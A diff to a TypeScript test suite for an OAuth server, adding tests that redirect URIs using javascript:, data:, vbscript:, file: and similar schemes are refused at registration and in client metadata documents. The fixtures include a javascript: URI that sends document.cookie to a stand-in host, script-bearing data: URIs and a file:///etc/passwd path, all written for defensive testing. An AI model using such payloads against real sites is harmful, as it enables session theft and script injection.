@@ -46,6 +46,25 @@ describe('isAcceptableRedirectUri', () => {
   ])('rejects %s', (_label, uri) => {
     expect(isAcceptableRedirectUri(uri)).toBe(false);
   });
+
+  // The private-use branch above accepts any unrecognised scheme, because that
+  // is what an RFC 8252 redirect looks like and there is no registry to check
+  // one against. These are the schemes that must not ride along on that: they
+  // name a capability rather than an application, and a registered one reaches
+  // both the consent page's `form-action` and a `Location` header carrying an
+  // authorization code.
+  it.each([
+    ['javascript:', 'javascript:fetch("https://evil.example/"+document.cookie)'],
+    ['uppercased javascript:', 'JavaScript:alert(1)'],
+    ['data:', 'data:text/html,<script>alert(1)</script>'],
+    ['vbscript:', 'vbscript:msgbox(1)'],
+    ['blob:', 'blob:https://evil.example/9b2c'],
+    ['file:', 'file:///etc/passwd'],
+    ['about:', 'about:blank'],
+    ['view-source:', 'view-source:https://evil.example/'],
+  ])('rejects the capability scheme %s', (_label, uri) => {
+    expect(isAcceptableRedirectUri(uri)).toBe(false);
+  });
 });
 
 describe('matchesRedirectUri', () => {
@@ -172,6 +191,35 @@ describe('registerClient', () => {
       client_name: 'x'.repeat(5000),
     });
     expect(result.ok && result.client.clientName).toHaveLength(200);
+  });
+});
+
+describe('registration rejects capability schemes end to end', () => {
+  it('refuses a javascript: redirect URI at /register', async () => {
+    const config = testConfig();
+    const result = await registerClient(config, newStore(config), {
+      redirect_uris: ['javascript:alert(1)'],
+    });
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.error).toBe('invalid_redirect_uri');
+  });
+
+  it('refuses a document whose only redirect URI is a capability scheme', async () => {
+    const clientId = 'https://evil.example/meta.json';
+    const config = testConfig();
+    const stub = stubFetch(
+      async () =>
+        new Response(JSON.stringify({ client_id: clientId, redirect_uris: ['data:text/html,x'] }), {
+          status: 200,
+        }),
+    );
+    try {
+      // Filtered down to nothing, which is `no_usable_redirect_uris` — a CIMD
+      // document cannot smuggle in what registration refuses.
+      expect(await resolveCimdClient(config, newStore(config), clientId)).toBeNull();
+    } finally {
+      stub.restore();
+    }
   });
 });
 
